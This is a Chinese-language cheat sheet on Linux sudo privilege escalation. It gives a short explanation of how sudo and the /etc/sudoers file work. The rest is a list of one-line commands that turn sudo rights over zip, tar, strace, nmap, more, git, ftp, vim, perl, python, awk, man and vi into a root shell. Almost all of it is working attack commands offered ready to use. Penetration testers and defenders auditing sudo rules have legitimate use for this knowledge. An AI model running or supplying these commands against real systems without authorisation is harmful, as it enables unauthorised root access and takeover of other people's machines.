# sudo 提权

#### sudo是什么？

给普通用户某个命令有root权限，并不需要给root密码，毕竟知道root密码的人越多越不安全。普遍的做法就是利用sudo （Substitute User and Do 的简写）给其临时授权,临时让其以root 权限运行某个程序。

#### sudo的执行原理

普通用户执行命令 -> 检查`/var/db/sudo/`目录下是否有用户时间戳 -> 检查/etc/sudoers配置文件，用户是否有sudo权限 -> 执行sudo命令并反回结果 -> 退出sudo返回普通用户shell环境。

其中步骤2检查：时间戳默认从上一次执行sudo命令5分钟后过期。

`/etc/sudoers` 或者使用`visudo`命令进行编辑。

文件语法：

`root ALL=(ALL) ALL`

* root表示用户名
* 第一个 ALL 指示允许从任何终端、机器访问sudo
* 第二个 (ALL)指示sudo命令被允许以任何用户身份执行
* 第三个 ALL 表示所有命令都可以作为root执行

使用`sudo -l`查看当前权限。

#### zip、tar、strace、nmap、more、git、ftp、vim、passwd

zip:

`sudo zip /tmp/tmp.zip /tmp/ -T --unzip-command="sh -c /bin/bash"`

* \-T 表示测试test.zip的完整性
* –unzip-command 与-T 一起使用，可以指定自定义命令用于解压test.zip

tar:

`sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/bash`

* –checkpoint-action选项是提权点,可以自定义需要执行的动作

strace:

`sudo strace -o /dev/null /bin/bash`

nmap:

```
低版本的nmap3.x 有interactive模式，且设置了suid，这个时候可以进入交互模式 执行!sh 命令即可轻松完成提权。 

echo "os.execute('/bin/bash')" > /tmp/shell.nse 
sudo nmap --script=/tmp/shell.nse
```

more:

```
sudo more /etc/hosts
!/bin/bash
```

git:

```
sudo git help status
!/bin/bash
```

ftp:

```
sudo ftp 
ftp> !/bin/bash
```

vim:

```
sudo vim -c '!bash'
```

#### perl、python、less、awk、man、vi

perl:

```
sudo perl -e 'exec "/bin/bash";'
```

python:

```
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

awk:

```
sudo awk 'BEGIN {system("/bin/bash")}'
```

man:

```
sudo man 
man !/bin/bash
```

vi:

```
sudo vi
!bash
```
